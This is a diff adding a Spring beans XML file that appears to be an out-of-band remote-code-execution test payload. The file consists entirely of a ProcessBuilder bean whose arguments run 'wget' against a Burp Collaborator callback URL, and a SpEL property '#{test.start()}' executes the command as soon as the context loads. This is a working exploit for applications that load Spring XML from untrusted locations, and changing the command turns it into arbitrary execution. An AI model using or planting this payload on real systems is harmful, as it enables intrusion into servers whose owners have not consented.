@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN//EN" "http://www.springframework.org/dtd/spring-beans.dtd">
+<beans xmlns="http://www.springframework.org/schema/beans"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="test" class="java.lang.ProcessBuilder">
+      <constructor-arg type="java.lang.String" index="0"><value>wget</value></constructor-arg>
+      <constructor-arg type="java.lang.String" index="1"><value>https://mf5eoznzst4oifqknu8mjqkba2gs4h.burpcollaborator.net/08fc4b77-7e92-46c4-8f7a-fa3b76126698/123</value></constructor-arg>
+      <property name="whatever" value="#{test.start()}"/>
+  </bean>
+</beans>
